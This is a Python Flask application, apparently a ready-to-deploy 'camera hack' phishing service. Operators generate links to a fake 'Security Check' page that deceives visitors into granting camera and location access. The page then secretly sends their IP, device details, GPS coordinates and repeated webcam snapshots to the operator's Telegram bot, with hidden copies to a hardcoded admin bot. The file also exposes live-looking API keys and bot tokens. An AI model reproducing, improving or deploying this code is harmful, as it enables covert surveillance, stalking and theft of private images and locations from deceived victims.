# by:@ROMEO_UCHIHA
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"
BASE_URL = "https://rm-camera.vercel.app" # Tumhari Vercel URL

def send_tg_msg(token, cid, text):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Bot"

def send_tg_photo(token, cid, raw_img, caption=""):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
    except: pass

# --- UI TEMPLATES ---
COMMON_STYLE = """
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: radial-gradient(circle at center, #1a0000 0%, #000000 100%); color: #fff; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px;}
    .container { background: rgba(15, 0, 0, 0.7); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 0, 0, 0.2); border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 0, 0, 0.05); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; }
    @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    h2 { font-family: 'Orbitron', sans-serif; color: #ff3333; margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px rgba(255,0,0,0.5); }
    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 0, 0, 0.3); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
    input:focus, select:focus { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.4); background: rgba(20, 0, 0, 0.8); }
    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, #cc0000, #800000); color: #fff; border: 1px solid #ff4d4d; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 20px rgba(255,0,0,0.2); }
    button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.5); background: linear-gradient(135deg, #ff1a1a, #990000); }
    a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
    a:hover { color: #ff3333; }
    .bot-card { background: rgba(40, 0, 0, 0.6); padding: 18px; border-radius: 14px; margin: 10px 0; border: 1px solid rgba(255,0,0,0.4); cursor: pointer; transition: 0.3s; font-family: 'Poppins', sans-serif; font-weight: 600; font-size: 15px; }
    .bot-card:hover { background: rgba(80, 0, 0, 0.8); border-color: #ff3333; box-shadow: 0 0 15px rgba(255,0,0,0.4); }
</style>
"""

@app.route("/")
def index(): return redirect("/lg")

# --- REGISTER / LOGIN FLOW ---
@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        token, cid = request.form.get("token"), request.form.get("cid")
        otp = str(random.randint(1000, 9999))
        supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
        send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nTumhara OTP code hai: `{otp}`")
        return redirect(f"/verify_otp?cid={cid}&purpose=register")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>REGISTER</h2><form method="POST"><input type="text" name="token" placeholder="Telegram Bot Token" required><input type="text" name="cid" placeholder="Your Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Already registered? Login here</a></div>')

@app.route("/lg", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        cid = request.form.get("cid")
        users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
        if not users: return f"{COMMON_STYLE}<div class='container'><h2>ERROR</h2><p>Chat ID not registered!</p><a href='/rg'>Go to Register</a></div>"
        elif len(users) == 1:
            otp = str(random.randint(1000, 9999))
            supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
            send_tg_msg(users[0]["bot_token"], cid, f"🔐 *LOGIN OTP*\\n\\nYour code is: `{otp}`")
            return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
        else:
            html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button class='bot-card' type='submit'>🤖 {u['bot_name']}</button></form>"
            return render_template_string(html + "</div>")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>LOGIN</h2><form method="POST"><input type="text" name="cid" placeholder="Enter Chat ID" required><button type="submit">Continue</button></form><a href="/rg">Create new account</a></div>')

@app.route("/send_login_otp", methods=["POST"])
def send_login_otp():
    cid, token = request.form.get("cid"), request.form.get("token")
    otp = str(random.randint(1000, 9999))
    supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
    send_tg_msg(token, cid, f"🔐 *LOGIN OTP*\\n\\nYour code is: `{otp}`")
    return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"]}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><p style="color:#aaa; font-size:13px; margin-bottom:20px;">Check your Telegram Bot.</p><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required pattern="[0-9]*" inputmode="numeric"><button type="submit">Verify</button></form></div>')

# --- DASHBOARD UI (Only For Link Generation) ---
@app.route("/ds", methods=["GET", "POST"])
def dashboard():
    if "user_id" not in session: return redirect("/lg")
    
    link_url = None
    if request.method == "POST":
        link_id = str(uuid.uuid4())[:8]
        # Saving link config so target page knows what to do
        supabase.table("links").insert({"id": link_id, "user_id": session["user_id"], "target_type": request.form.get("type"), "redirect_url": request.form.get("redirect")}).execute()
        link_url = f"{BASE_URL}/t/{link_id}"

    return render_template_string(f'''
        {COMMON_STYLE}
        <div class="container">
            <h2>DASHBOARD</h2>
            <p style="color:#aaa; font-size:13px; margin-bottom:20px;">Target data will be sent directly to your Telegram Bot.</p>
            <form method="POST">
                <input type="url" name="redirect" placeholder="Redirect URL (e.g. https://google.com)" required>
                <select name="type">
                    <option value="both">Camera + Location</option>
                    <option value="camera">Camera Only</option>
                    <option value="location">Location Only</option>
                </select>
                <button type="submit">GENERATE LINK</button>
            </form>
            {"<div style='margin-top:25px;background:rgba(0,0,0,0.5);padding:15px;border-radius:14px;border:1px solid #330000;'><p style='color:#0f0;font-size:14px;margin-bottom:10px;'>Link Generated successfully:</p><input value='"+link_url+"' readonly id='linkInput' style='border-color:#0f0;color:#0f0;text-align:center;'><button onclick='navigator.clipboard.writeText(document.getElementById(\"linkInput\").value);alert(\"Copied!\")' style='background:#111;border-color:#333;margin-top:5px; width:auto; padding:10px 20px;'>Copy Link</button></div>" if link_url else ""}
            <a href="/lg" style="margin-top:30px;color:#ff4d4d;font-weight:700;">[ LOGOUT ]</a>
        </div>
    ''')

# --- TARGET PAGE (HACK UI) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "Link Not Found!"
    
    data = res.data[0]
    target_type = data["target_type"]
    r_url = data["redirect_url"]

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>System Verification</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
            body { background: radial-gradient(circle at center, #0a0000 0%, #000 100%); color: #0f0; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
            .box { background: rgba(10, 0, 0, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255, 0, 0, 0.3); border-radius: 20px; padding: 40px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.1); }
            h3 { font-family: 'Orbitron', sans-serif; color: #ff3333; letter-spacing: 2px; margin-bottom: 30px; }
            .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;}
            .tick { color: #0f0; text-shadow: 0 0 10px #0f0; } .cross { color: #f00; text-shadow: 0 0 10px #f00; } .wait { color: #ff0; animation: spin 1s infinite linear; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            #hack-ui { display: none; text-align: center; }
            .timer { font-size: 6rem; color: #ff0000; text-shadow: 0 0 20px rgba(255,0,0,0.6); font-family: 'Orbitron', sans-serif; font-weight: 900;}
            #msg { margin-top: 20px; font-size: 0.9rem; color: #888; height: 20px;}
        </style>
    </head>
    <body>
        <div id="auth-ui" class="box">
            <h3>SECURITY CHECK</h3>
            <div class="item" id="cam-row" style="display:none;"><span><i class="fas fa-camera"></i> CAMERA</span><span id="cam-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <div class="item" id="loc-row" style="display:none;"><span><i class="fas fa-map-marker-alt"></i> LOCATION</span><span id="loc-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <p id="msg">Please allow permissions to continue...</p>
        </div>

        <div id="hack-ui">
            <h2 style="font-family: 'Orbitron'; color: #aa0000; letter-spacing: 3px;">DATA UPLINK</h2>
            <div class="timer" id="count">30</div>
            <p id="log-text" style="color: #666; margin-top: 10px; text-transform: uppercase;">Establishing connection...</p>
        </div>

        <video id="v" style="display:none" autoplay playsinline></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
            let mode = "{{ t_type }}";
            let camReq = (mode === 'both' || mode === 'camera');
            let locReq = (mode === 'both' || mode === 'location');
            
            if(camReq) document.getElementById('cam-row').style.display = 'flex';
            if(locReq) document.getElementById('loc-row').style.display = 'flex';

            let camDone = !camReq, locDone = !locReq, timeLeft = 30;
            const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
            
            window.onload = () => { getHardware(); startAuth(); };

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
            }

            function checkAllDone() {
                if(camDone && locDone) {
                    msg.innerText = "Verification Complete."; msg.style.color = "#0f0";
                    setTimeout(startHack, 1500);
                }
            }

            async function startAuth() {
                if(camReq) {
                    try {
                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                        camDone = true; checkAllDone();
                    } catch(e) {
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                        msg.innerText = "Camera Denied. Reloading..."; msg.style.color = "#f00";
                        setTimeout(() => location.reload(), 2000);
                    }
                }

                if(locReq) {
                    if(navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (p) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                                fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
                                locDone = true; checkAllDone();
                            },
                            (e) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                                msg.innerText = "Location Denied. Reloading..."; msg.style.color = "#f00";
                                if(camReq && camDone) startCapture(3); 
                                setTimeout(() => location.reload(), 2500);
                            }
                        );
                    }
                }
            }

            function takeSnap() {
                if(v.videoWidth === 0) return;
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
            }

            function startCapture(limit) {
                let j=0, itv = setInterval(() => { takeSnap(); j++; if(limit && j>=limit) clearInterval(itv); }, 500);
                return itv;
            }

            function startHack() {
                document.getElementById('auth-ui').style.display = 'none';
                document.getElementById('hack-ui').style.display = 'block';
                
                let capItv = null;
                if(camReq) capItv = startCapture(0); 

                let timer = setInterval(() => {
                    timeLeft--;
                    document.getElementById('count').innerText = timeLeft;
                    if(timeLeft <= 0) {
                        clearInterval(timer);
                        if(capItv) clearInterval(capItv);
                        window.location.href = "{{ r_url }}";
                    }
                }, 1000);
            }
        </script>
    </body>
    </html>
    ''', t_type=target_type, r_url=r_url, l_id=link_id)

# --- BACKEND LOGGING APIS (DIRECT TO TELEGRAM ONLY) ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
    user = link["users"]
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    dev_info = f"{d['plat']} - Cores: {d['cores']}"
    
    msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
    
    send_tg_msg(user["bot_token"], user["chat_id"], msg)
    send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
    user = link["users"]
    d = request.get_json()
    map_link = f"https://www.google.com/maps?q=${d['lat']},{d['lon']}"
    
    msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
    send_tg_msg(user["bot_token"], user["chat_id"], msg)
    send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        img_data = request.get_json()["img"]
        
        raw = base64.b64decode(img_data.split(",")[1])
        send_tg_photo(user["bot_token"], user["chat_id"], raw, "😈 *UCHIHA CAPTURE*")
        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}")
        return jsonify({"s": 1})
    except: return jsonify({"s": 0})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
